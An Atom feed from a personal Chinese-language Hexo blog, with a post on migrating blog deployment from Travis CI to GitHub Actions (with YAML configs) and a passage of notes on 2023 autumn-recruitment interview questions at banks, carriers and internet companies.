<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Jckling&#39;s Blog</title>
  
  
  <link href="https://jckling.github.io/atom.xml" rel="self"/>
  
  <link href="https://jckling.github.io/"/>
  <updated>2023-03-06T15:01:58.476Z</updated>
  <id>https://jckling.github.io/</id>
  
  <author>
    <name>Jckling</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Github Action 自动部署 Hexo 博客</title>
    <link href="https://jckling.github.io/2023/02/18/Other/Github%20Action%20%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2%20Hexo%20%E5%8D%9A%E5%AE%A2/"/>
    <id>https://jckling.github.io/2023/02/18/Other/Github%20Action%20%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2%20Hexo%20%E5%8D%9A%E5%AE%A2/</id>
    <published>2023-02-18T13:00:25.000Z</published>
    <updated>2023-03-06T15:01:58.476Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>刚开始使用 Github 托管博客时使用 <a href="https://jckling.github.io/2020/04/23/Other/Travis%20CI%20%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2/">Travis CI 自动部署 Hexo 博客</a>，一个私人仓库用于备份博客源码，另一个公开仓库用于托管静态页面，但是最近将修改的文章推送到私人仓库时没有触发 Travis CI 的工作流，提示 👇</p><img src="https://s2.loli.net/2023/02/18/ph562ruwxdMDYF3.jpg"><p>查询 Plan 页面发现自己使用的是免费版，目前的策略是一次性给予用户 10000 可用额度，而我还剩余 3700 可用额度，并且开启了 <code>Consume paid credits for OSS</code> 选项：</p><img src="https://s2.loli.net/2023/02/18/56nRbxzojY3tlqF.png" width="65%"><p>搜索了一圈发现也有相同情况的用户，看起来没什么解决办法，除非掏钱（手动狗头）。</p><ul><li><a href="https://travis-ci.community/t/builds-just-stopped-due-to-a-negative-credit-balance-despite-having-an-active-subscription/10817">Builds just stopped due to a negative credit balance despite having an active subscription</a></li><li><a href="https://github.com/keptn/keptn/issues/2715">Travis CI builds are disabled due to negative credit balance #2715</a></li><li><a href="https://www.v2ex.com/t/736510">Travis CI 改变收费策略了，还在使用免费方案的朋友们需要注意了</a></li></ul><p>之前写的 <a href="https://github.com/jckling/Daily-Bonus">签到脚本</a> 和 <a href="https://github.com/jckling/tg-bot">推送脚本</a> 都是用 Github Action 定时运行，而且 Github 还提供了从 Travis CI 迁移到 Github Action 的指南 <a href="https://docs.github.com/en/actions/migrating-to-github-actions/migrating-from-travis-ci-to-github-actions">Migrating from Travis CI to GitHub Actions</a>，个人感觉迁移还是比较容易的。</p><h1 id="Travis-CI-配置文件"><a href="#Travis-CI-配置文件" class="headerlink" title="Travis CI 配置文件"></a>Travis CI 配置文件</h1><p>在 Travis-CI 的任务页面点击 <code>View Config</code> 可以看到私人仓库根目录下的 .travis.yml 配置文件，具体写法可以参考 Travis CI 的文档 <a href="https://docs.travis-ci.com/user/languages/javascript-with-nodejs/">Building a JavaScript and Node.js project</a>。</p><p>注意，配置中的 <code>GH_TOKEN</code> 是在 Github 中生成的 <a href="https://github.com/settings/tokens">Personal access tokens</a></p><ol><li><code>dist</code>：使用 focal 发行版的 Ubuntu 运行</li><li><code>language</code>：使用 Node.js</li><li><code>node_js</code>：安装长期支持版本的 Nodejs</li><li><code>cache</code>：缓存 node_modules</li><li><code>branches</code>：仅 master 分支会触发工作流</li><li><code>before_install</code>：设置时区和 Github 用户名&#x2F;邮箱</li><li><code>install</code>：使用 yarn 安装依赖</li><li><code>script</code>：执行 <code>hexo generate</code> 生成静态页面</li><li><code>after_script</code>：将新生成的静态页面提交到公开仓库</li></ol><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">dist:</span> <span class="string">focal</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">node_js</span></span><br><span class="line"><span class="attr">node_js:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">lts/*</span></span><br><span class="line"><span class="attr">cache:</span></span><br><span class="line">  <span class="attr">yarn:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">directories:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">node_modules</span></span><br><span class="line"><span class="attr">branches:</span></span><br><span class="line">  <span class="attr">only:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">master</span></span><br><span class="line"><span class="attr">before_install:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">export</span> <span class="string">TZ=&#x27;Asia/Shanghai&#x27;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">git</span> <span class="string">config</span> <span class="string">--global</span> <span class="string">user.name</span> <span class="string">&quot;jckling&quot;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">git</span> <span class="string">config</span> <span class="string">--global</span> <span class="string">user.email</span> <span class="string">&quot;jckling@163.com&quot;</span></span><br><span class="line"><span class="attr">install:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">yarn</span> <span class="string">install</span></span><br><span class="line"><span class="attr">script:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">hexo</span> <span class="string">generate</span></span><br><span class="line"><span class="attr">after_script:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">git</span> <span class="string">clone</span> <span class="string">https://github.com/jckling/jckling.github.io.git</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">cp</span> <span class="string">-r</span> <span class="string">./public/*</span> <span class="string">./jckling.github.io/</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">cd</span> <span class="string">jckling.github.io</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">git</span> <span class="string">add</span> <span class="string">.</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">git</span> <span class="string">commit</span> <span class="string">-m</span> <span class="string">&quot;Travis-CI Automated Deployment $(date +&#x27;%Y-%m-%d %H:%M:%S&#x27;)&quot;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">git</span> <span class="string">push</span> <span class="string">&quot;https://$&#123;GH_TOKEN&#125;@github.com/jckling/jckling.github.io.git&quot;</span> <span class="string">master</span></span><br></pre></td></tr></table></figure><h1 id="迁移到-Github-Action"><a href="#迁移到-Github-Action" class="headerlink" title="迁移到 Github Action"></a>迁移到 Github Action</h1><p>Github Action 的配置文件必须在仓库根目录的 .github&#x2F;workflows&#x2F; 路径下，因此得先在博客根目录创建文件夹。之前把文件夹创建成了 workflow 导致没有触发工作流……</p><p>在 workflows 目录下创建并添加配置文件 deploy.yml，改写后的配置文件如下：</p><ol><li><code>name</code>：工作流名称，自动触发时会以此作为名称，推送触发会以说明作为名称</li><li><code>on</code>：仅 push 触发，仅限 master 分支 </li><li><code>jobs</code>：作业<ul><li><code>deploy</code>：作业名称，唯一<ul><li><code>runs-on</code>：使用最新的 Ubuntu 系统运行，目前是 20.04</li><li><code>env</code>：设置环境变量，参见 <a href="https://github.com/jckling/Daily-Bonus#%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F">签到脚本使用方式</a></li><li><code>steps</code>：任务</li></ul></li></ul></li></ol><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">Hexo</span> <span class="string">Blog</span></span><br><span class="line"></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">master</span></span><br><span class="line"></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">deploy:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">env:</span></span><br><span class="line">      <span class="attr">GH_TOKEN:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.GH_TOKEN</span> <span class="string">&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/checkout@v3</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">submodules:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Set</span> <span class="string">up</span> <span class="string">timezone</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">sudo</span> <span class="string">timedatectl</span> <span class="string">set-timezone</span> <span class="string">&#x27;Asia/Shanghai&#x27;</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Echo</span> <span class="string">current</span> <span class="string">time</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">timedatectl</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Set</span> <span class="string">up</span> <span class="string">Node.js</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/setup-node@v3</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">node-version:</span> <span class="string">lts/*</span></span><br><span class="line">          <span class="attr">cache:</span> <span class="string">&#x27;yarn&#x27;</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Install</span> <span class="string">Hexo</span> <span class="string">CLI</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">npm</span> <span class="string">install</span> <span class="string">-g</span> <span class="string">hexo-cli</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Install</span> <span class="string">dependencies</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">borales/actions-yarn@v4</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">cmd:</span> <span class="string">install</span></span><br><span class="line">      </span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Generate</span> <span class="string">pages</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">hexo</span> <span class="string">generate</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Git</span> <span class="string">config</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          git config --global user.name &quot;jckling&quot;</span></span><br><span class="line"><span class="string">          git config --global user.email &quot;jckling@163.com&quot;</span></span><br><span class="line"><span class="string"></span>      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Deploy</span> <span class="string">blog</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          git clone https://github.com/jckling/jckling.github.io.git</span></span><br><span class="line"><span class="string">          cp -r ./public/* ./jckling.github.io/</span></span><br><span class="line"><span class="string">          cd jckling.github.io</span></span><br><span class="line"><span class="string">          git add .</span></span><br><span class="line"><span class="string">          git commit -m &quot;Github Action Automated Deployment $(date +&#x27;%Y-%m-%d %H:%M:%S&#x27;)&quot;</span></span><br><span class="line"><span class="string">          git push &quot;https://$&#123;GH_TOKEN&#125;@github.com/jckling/jckling.github.io.git&quot; master</span></span><br></pre></td></tr></table></figure><p>删除原先的 Travis CI 配置文件 .travis.yml，目前备份的博客内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">├── .gitignore</span><br><span class="line">├── _config.yml</span><br><span class="line">├── _config.butterfly.yml</span><br><span class="line">├── yarn.lock</span><br><span class="line">├── package.json</span><br><span class="line">├── .github</span><br><span class="line">│   └── workflows</span><br><span class="line">│      └── deploy.yml</span><br><span class="line">├── scaffolds</span><br><span class="line">│   ├── draft.md</span><br><span class="line">│   ├── page.md</span><br><span class="line">│   └── post.md</span><br><span class="line">├── source</span><br><span class="line">│   ├── robots.txt</span><br><span class="line">│   ├── _data</span><br><span class="line">│   ├── _posts</span><br><span class="line">│   ├── about</span><br><span class="line">│   ├── categories</span><br><span class="line">│   ├── link</span><br><span class="line">│   ├── music</span><br><span class="line">│   └── tags</span><br><span class="line">└── themes</span><br><span class="line">    └── butterfly</span><br></pre></td></tr></table></figure><h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><p>Github Action 没有很好的本地测试工具，因此迁移时在博客仓库中新建了一个 test 分支进行测试，注意测试时需要允许测试分支的提交触发构建流程：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">master</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">test</span></span><br></pre></td></tr></table></figure><p>测试完毕后可以直接合并到主分支，或修改 Github Action 的配置文件后提交到主分支。</p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>本来以为只有私有仓库受到影响，没想到公开仓库也因为额度问题不能使用 Travis CI 了，不得不把 Github Profile 仓库的自动更新脚本也迁移到 Github Action 😒</p>]]></content>
    
    
    <summary type="html">从 Travis CI 迁移到 Github Action</summary>
    
    
    
    <category term="Other" scheme="https://jckling.github.io/categories/Other/"/>
    
    
    <category term="Github Action" scheme="https://jckling.github.io/tags/Github-Action/"/>
    
    <category term="Hexo" scheme="https://jckling.github.io/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>23 届秋招面试总结</title>
    <link href="https://jckling.github.io/2022/11/30/Notes/23%20%E5%B1%8A%E7%A7%8B%E6%8B%9B%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/"/>
    <id>https://jckling.github.io/2022/11/30/Notes/23%20%E5%B1%8A%E7%A7%8B%E6%8B%9B%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/</id>
    <published>2022-11-30T08:40:05.000Z</published>
    <updated>2023-01-09T14:18:59.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>大致可以分为「运营商&#x2F;银行」与「软件&#x2F;互联网」，电商、自动驾驶、游戏等归类到「软件&#x2F;互联网」当中。和 <a href="https://jckling.github.io/2022/05/20/Notes/23%20%E5%B1%8A%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/">23 届暑期实习面试总结</a> 一样，按<strong>一面</strong>时间顺序进行罗列。</p><h1 id="运营商-x2F-银行"><a href="#运营商-x2F-银行" class="headerlink" title="运营商&#x2F;银行"></a>运营商&#x2F;银行</h1><p>银行似乎都只有一轮面试，不过收到的都是差额体检。运营商面了没后续消息就默认挂了（摊手）。</p><h2 id="中国移动信息技术中心"><a href="#中国移动信息技术中心" class="headerlink" title="中国移动信息技术中心"></a>中国移动信息技术中心</h2><p>过了差不多一个月才出结果，已拒。</p><p><strong>一面（10min）</strong></p><ol><li>自我介绍</li><li>全栈项目介绍，数据处理是怎么做的</li><li>用过的数据库，是否做过性能调优</li><li>反问：多久出结果</li></ol><p><strong>二面（15min）</strong></p><ol><li>自我介绍</li><li>亚马逊全栈项目介绍，和实验室项目比较</li><li>常用的数据库，关注点（读写效率）</li><li>更想学技术还是本身技术就很厉害（？当然是学技术来的）</li><li>反问：组织架构<ul><li>财务、招新、物流系统</li><li>专业、系统、运维</li><li>120+ 人</li></ul></li></ol><h2 id="联通软件研究院"><a href="#联通软件研究院" class="headerlink" title="联通软件研究院"></a>联通软件研究院</h2><p>被「最不成功的经历」问倒了，还真没有遇到过问这个的😂</p><p><strong>一面（6min）</strong></p><ol><li>自我介绍</li><li>最不成功的经历</li><li>遇到困难&#x2F;瓶颈，如何解决（沟通、代码）</li><li>倾向于什么方向（开发）</li><li>接受工作看重的点：公司口碑、工作地点、薪酬福利</li><li>是否接受调剂</li></ol><h2 id="中国电信安全公司"><a href="#中国电信安全公司" class="headerlink" title="中国电信安全公司"></a>中国电信安全公司</h2><p>应该是「天翼安全科技」，双总部（北京、江苏），然后两边都面了，接到江苏的 offer，已拒。</p><h3 id="北京"><a href="#北京" class="headerlink" title="北京"></a>北京</h3><p><strong>一面</strong></p><ol><li>算法：有序数组查找数字</li><li>计网：浏览器过程、DNS 查询方式、DNS 劫持&#x2F;缓存污染、TLS 过程</li><li>操作系统：地址空间由什么决定</li><li>Linux 命令：查找关键字 <code>grep</code>，查看文件、查看资源</li><li>Java：HashMap 底层、是否线程安全、线程安全的实现类是什么、怎么实现的、<code>synchronized</code> 底层、<code>volatile</code> 底层、线程池过程</li><li>MySQL：日志及其作用、MVCC、索引、B+ 树和 B 树比较、联合索引什么情况失效、慢查询优化</li><li>Redis：常见数据类型、为什么快、哨兵的作用</li><li>RPC：gRPC、Thrift、Dubbo</li><li>是否有 offer，选择的依据：口碑、地点、工作氛围</li><li>反问<ul><li>几轮：2 面 + HR 面</li><li>技术开发（北京、苏州），Java 技术栈为主<ul><li>集团侧</li><li>政治：国家、信通院</li><li>产品、售前、售后：安全资源能力池、Java 池、安全保障、联防联检</li></ul></li></ul></li></ol><p><strong>二面</strong></p><ol><li>自我介绍</li><li>全栈项目介绍</li><li>如何学习 Java</li><li>是否看过 JDK API</li><li>如何使用 Collections 容器</li><li>Java 中的快排是哪个实现（Arrays.sort），Collections.sort 使用归并</li><li>有用过 React 吗，路由如何实现，js compact 如何实现</li><li>OpenStack 都有哪些组件，了解 neutron 吗</li><li>线程安全怎么定义</li><li>设计模式都有哪些</li><li>Dockerfile 常用指令</li><li>反问<ul><li>架构：一级分公司，集团部门，类似北京电信</li><li>新人：mentor 带，主要是后台开发</li></ul></li></ol><h3 id="江苏"><a href="#江苏" class="headerlink" title="江苏"></a>江苏</h3><p>二面后隔了三周接到 HR 面。</p><p><strong>一面</strong></p><ol><li>自我介绍</li><li>安全分类：Web 安全、软件安全</li><li>用了哪些国密算法（SM2、SM3）用在哪里（TLS、证书）</li><li>Java 程序分析系统原理介绍（Neo4j）</li><li>docker 常用命令、docker-compose 简单介绍、是否了解 k8s（用过 Kolla-Ansible）</li><li>Java 的集合，HashMap 底层原理，扩容机制</li><li>用过哪些 Java 框架，是否了解 Spring Boot 之类的 </li><li>B+ 树用在哪里：MySQL 索引、用途、优点、时间复杂度</li><li>设计模式：StringBuilder 是建造者模式</li><li>反问<ul><li>组织架构：双总部（北京、苏州），苏州注册</li><li>业务（网络安全）：安全应用&#x2F;平台开发、供攻防</li><li>面试：技术 + 领导 + HR</li></ul></li></ol><p><strong>二面</strong></p><ol><li>自我介绍</li><li>家乡是哪里的</li><li>工作地点选择</li><li>是不是党员</li><li>有什么 offer</li><li>介绍 Java 程序分析系统，实际的应用效果</li><li>介绍全栈项目，解决的问题</li><li>了解哪些前端可视化工具</li><li>ARP 协议是哪层的</li><li>有什么 Web 攻击</li><li>反问<ul><li>北京、苏州的都面了（？）</li><li>大约 10 天内出结果</li></ul></li></ol><p><strong>HR 面</strong></p><ol><li>自我介绍</li><li>实习收获</li><li>公司介绍<ul><li>15 年，网络安全产品中心（研发、运营）</li><li>业务：云网、安全、外部&#x2F;内部</li><li>优势：垄断资源</li></ul></li><li>反问：3-5 天出结果</li></ol><h2 id="建信金科"><a href="#建信金科" class="headerlink" title="建信金科"></a>建信金科</h2><p>这个也过了差不多一个月才出结果，已拒。</p><p><strong>一面</strong></p><ol><li>自我介绍</li><li>为什么想来上海</li><li>项目中最有成就感的事情</li><li>链路追踪系统介绍</li><li>SM2 算法介绍、SM3 算法是干嘛的</li><li>还做过哪些与安全相关的项目</li><li>信息&#x2F;软件安全考虑哪些方面，或者有什么网络攻击</li><li>有没有论文&#x2F;专利</li><li>Java 中的锁介绍一下，<code>synchronized</code> 的性能如何，是什么类型的锁</li><li>反问：业务<ul><li>全资子公司，事业群&#x2F;中心，部门 20+</li><li>新人分配：根据团队&#x2F;项目需求&#x2F;发展目标</li></ul></li></ol><h2 id="中国农业银行研发中心"><a href="#中国农业银行研发中心" class="headerlink" title="中国农业银行研发中心"></a>中国农业银行研发中心</h2><p>总行双机位站立面试，差额体检，已拒。</p><p><strong>一面</strong></p><ol><li>自我介绍</li><li>介绍全栈项目，用到的技术点</li><li>介绍链路追踪，用到的技术点</li><li>介绍 Java 程序分析系统，除了反序列化漏洞还能检测什么（语句级别、其他语言扩展）</li><li>SQL 注入与防护、XSS 漏洞</li><li>docker：与虚拟机的区别、容器与镜像的关系、与虚拟机的安全性差异</li><li>接触过的数据库</li><li>Java 类加载机制</li><li>对银行的看法</li></ol><h2 id="交通银行总行金融科技部门"><a href="#交通银行总行金融科技部门" class="headerlink" title="交通银行总行金融科技部门"></a>交通银行总行金融科技部门</h2><p>面试，测评，背调，已拒。</p><p><strong>一面</strong></p><ol><li>自我介绍</li><li>多线程编程（Thread、Runnable&#x2F;Callable）</li><li>docker 命令，Linux&#x2F;Windows 上都有用过</li><li>Linux 命令：find、rm、mv</li><li>go 相关命令：只记得 <code>go mod</code></li><li>MySQL，白话解释事务，如何实现一致性（MVCC、加锁），慢查询优化方式</li><li>数据库表添加列用什么指令（ALTER）</li><li>有用 Redis 写阻塞队列吗</li><li>进程间通信方式</li><li>为什么选择上海&#x2F;金融</li></ol><h2 id="中国移动上海产业研究院"><a href="#中国移动上海产业研究院" class="headerlink" title="中国移动上海产业研究院"></a>中国移动上海产业研究院</h2><p>还真有人会问有没有对象啊😅 时隔一个月收到意向，已拒。三周后接到回访电话，点个赞。</p><p><strong>一面</strong></p><ol><li>自我介绍</li><li>介绍最有挑战性的项目</li><li>三到五年职业规划</li><li>业余爱好</li><li>三个形容词描述自己，朋友怎么评价自己的</li><li>遇到很难沟通的上级或同事咋办</li><li>有哪些地方的 offer</li><li>是否有男朋友</li><li>反射用在哪了哪里，介绍 Java 程序分析系统</li><li>如何分析调用，dfs&#x2F;bfs？</li><li>反射获取类有几种方式（3 种）</li></ol><h2 id="北京移动"><a href="#北京移动" class="headerlink" title="北京移动"></a>北京移动</h2><p>安排在周日上午，比较敷衍。</p><p><strong>一面（8min）</strong></p><ol><li>自我介绍（毕业时间、生源地）</li><li>形容自己、内向&#x2F;外向、和别人的相处模式（主动&#x2F;被动）</li><li>亚马逊实习的收获</li><li>工作中可以立即上手的地方，还欠缺什么技能</li><li>调剂（技术岗即可）、郊区（无所谓）、户口（最好有）、投递其他岗位（不记得）</li></ol><h2 id="工商银行软件开发中心"><a href="#工商银行软件开发中心" class="headerlink" title="工商银行软件开发中心"></a>工商银行软件开发中心</h2><p>投递了上海和成都，拒绝了成都的面试。时隔一个月收到体检通知，已拒。</p><p><strong>一面</strong></p><ol><li>自我介绍</li><li>Java 程序分析系统<ul><li>介绍</li><li>是否已上线</li><li>技术栈</li></ul></li><li>为什么想来上海</li><li>反问：业务<ul><li>金融产品</li><li>自研，类似 SpringBoot</li><li>MySQL、华为云</li><li>大数据、Hadoop</li></ul></li></ol><h2 id="中国光大银行信用卡中心"><a href="#中国光大银行信用卡中心" class="headerlink" title="中国光大银行信用卡中心"></a>中国光大银行信用卡中心</h2><p>约三周后收到二面，已拒。此外，还投递了「中国光大银行总行信息科技部」，面试拒了。</p><p><strong>一面</strong></p><ol><li>自我介绍</li><li>链路追踪系统 Jaeger 与 Dapr 的区别，侵入性如何<ul><li>不了解 Dapr，应该是针对 Java 的</li><li>OpenStack 云平台是 Python 开发的</li></ul></li><li>区块链用的什么共识算法，解释下 HTTPS</li><li>通俗地描述一下亚马逊的全栈项目</li></ol><h1 id="软件-x2F-互联网"><a href="#软件-x2F-互联网" class="headerlink" title="软件&#x2F;互联网"></a>软件&#x2F;互联网</h1><h2 id="美团"><a href="#美团" class="headerlink" title="美团"></a>美团</h2><p>前 5 轮面的是外卖柜业务、共享单车业务的后端开发工程师，最后 1 轮面的是优选业务的软件开发工程师。可拉倒吧🙄</p><p><strong>一面</strong></p><ol><li>自我介绍</li><li>部门介绍</li><li>链路追踪<ul><li>如何传递追踪信息</li><li>如何实现多线程追踪</li></ul></li><li>消息队列<ul><li>rabbitmq 有几种模式</li><li>消息处理失败怎么办</li></ul></li><li>ES</li><li>问题<ul><li>SQL</li><li>dp</li><li>线段切分为三角形的概率</li></ul></li></ol><p><strong>二面</strong></p><ol><li>自我介绍</li><li>讲述最熟悉的项目</li><li>中间件（消息队列）<ul><li>如何实现</li><li>传输数据</li></ul></li><li>RPC<ul><li>传输数据</li><li>从头实现 RPC 会怎么写</li></ul></li><li>设计模式<ul><li>装饰器</li><li>适配器</li></ul></li><li>题目<ul><li>SQL</li><li>区间合并（不让用 C++，用 Java 写）</li></ul></li></ol><p><strong>三面</strong></p><ol><li>自我介绍</li><li>区块链<ul><li>RSA 算法</li><li>对称加密和非对称加密</li><li>CA 黑名单功能（节点黑名单，拒绝节点的连接）</li><li>入网流程</li></ul></li><li>Java 程序分析系统<ul><li>有哪些反序列化漏洞</li><li>漏洞检测流程</li></ul></li><li>NoSQL 和 SQL 的区别<ul><li>是否了解 DDB</li><li>Redshift 的底层实现</li></ul></li><li>亚马逊全栈项目介绍</li><li>有关注什么领域<ul><li>什么是云原生</li><li>有哪些内容（服务器、网络、存储、身份认证、等等）</li></ul></li><li>更想做偏向业务的还是基础架构<ul><li>基础架构，之前在亚马逊就是非常贴近业务，直接和卖家交流了都</li></ul></li><li>反问<ul><li>新人进去会接触什么</li><li>晋升机制</li></ul></li></ol><p><strong>一面</strong></p><ol><li>自我介绍</li><li>MySQL<ul><li>引擎</li><li>索引</li><li>查询优化</li></ul></li><li>Redis<ul><li>数据类型，应用场景</li></ul></li><li>消息队列<ul><li>RabbitMQ</li><li>还有哪些 MQ：Kafka、RocketMQ、ZeroMQ</li></ul></li><li>TCP&#x2F;IP：三次握手，四次挥手</li><li>最有成就感的项目及其内容，技术栈</li><li>算法：走楼梯（3 种走法），动态规划</li><li>反问<ul><li>什么时候出结果</li><li>有几轮面试：3 轮</li></ul></li></ol><p><strong>二面</strong></p><ol><li>自我介绍</li><li>最有挑战的项目<ul><li>全栈项目，数据处理，Lambda 优化</li></ul></li><li>还有什么难点可以介绍<ul><li>链路追踪插桩</li></ul></li><li>项目相关问题<ul><li>数据存储在什么数据库</li><li>Lambda 执行耗时</li><li>如何传递追踪数据：traceId</li><li>每次调用都要生成什么追踪信息（优化）<ul><li>一条 trace 中只生成 span 信息，不用再生成 traceId</li></ul></li><li>如何设计数据的存储，查询时间范围内调用了该组件的 trace<ul><li>分 trace 和 span 存储</li></ul></li></ul></li><li>Java 线程状态：不了解，然后不问 Java 了</li><li>如何学习新技术</li><li>读过哪些设计</li><li>未来 3-5 年的规划</li><li>反问<ul><li>业务用的框架</li></ul></li></ol><p><strong>一面</strong></p><ol><li>自我介绍</li><li>全栈项目介绍，如果没有工具如何自己实现</li><li>算法：LC41</li><li>系统设计：停车场</li><li>反问：业务<ul><li>优选（业务）</li><li>大数据部门（工程）</li><li>技术栈：Java、Python、可视化</li></ul></li></ol><h2 id="科大讯飞"><a href="#科大讯飞" class="headerlink" title="科大讯飞"></a>科大讯飞</h2><p>10 月接了意向，12 月打电话问我是否有人对接，已拒😅</p><p><strong>一面</strong></p><ol><li>自我介绍</li><li>项目总结：提炼、总结</li><li>JVM<ul><li>内存区域</li><li>垃圾收集器</li><li>垃圾回收</li><li>性能调优（JVM 参数）</li></ul></li><li>ThreadLocal 内存泄漏</li><li>Spring 